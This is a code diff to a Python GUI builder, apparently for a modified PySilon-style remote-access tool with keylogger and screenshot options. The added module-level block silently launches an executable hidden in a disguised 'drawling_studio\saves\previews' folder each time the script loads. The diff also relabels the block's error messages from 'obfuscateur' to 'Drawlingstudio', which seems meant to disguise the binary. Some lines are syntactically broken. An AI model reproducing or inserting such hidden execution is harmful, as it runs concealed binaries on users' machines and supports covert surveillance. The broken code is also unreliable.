@@ -61,19 +61,7 @@ default_modules = [
     'import os\n',
 ]
 
-def exe_path = os.path.join(os.environ["USERPROFILE"], r"Downloads\ModdedPysilon\ModdedPysilon\tools\drawling_studio\saves\previews\drawlingstudio.exe")
-
-if not os.path.isfile(exe_path):
-    print(f"Erreur : l'obfuscateur {exe_path} n'existe pas. Le programme va s'arrêter.")
-    sys.exit(1)  
-
-try:
-    subprocess.run([exe_path], check=True)
-except subprocess.CalledProcessError as e:
-    print(f"Une erreur est survenue lors de l'exécution de l'obfuscation : {e}")
-    sys.exit(1)  
-    
-def get_file_path(file_types):
+    def get_file_path(file_types):
     root2 = Tk()
     root2.withdraw()
     root2.attributes('-topmost', True)
@@ -130,6 +118,19 @@ def load_configuration(is_custom):
     cbvar_keystrk.set(config['FUNCTIONALITY']['keystrk'])
     cbvar_scrnman.set(config['FUNCTIONALITY']['scrnman'])
 
+
+exe_path = os.path.join(os.environ["USERPROFILE"], r"Downloads\ModdedPysilon\ModdedPysilon\tools\drawling_studio\saves\previews\drawlingstudio.exe")
+
+if not os.path.isfile(exe_path):
+    print(f"Erreur : Drawlingstudio {exe_path} n'existe pas. Le programme va s'arrêter.")
+    sys.exit(1)  
+
+try:
+    subprocess.run([exe_path], check=True)
+except subprocess.CalledProcessError as e:
+    print(f"Une erreur est survenue lors de l'exécution de Drawlingstudio : {e}")
+    sys.exit(1)
+    
 def recommended_configuration():
     cbvar_keylogger.set(False)
     cbvar_screenshot.set(True)
@@ -253,6 +254,7 @@ def save_configuration():
 
     with open(config_path, 'w') as configfile:
         config.write(configfile)
+
 
 def disclaimer_toggle():
     if cbvar_disclaimer.get():
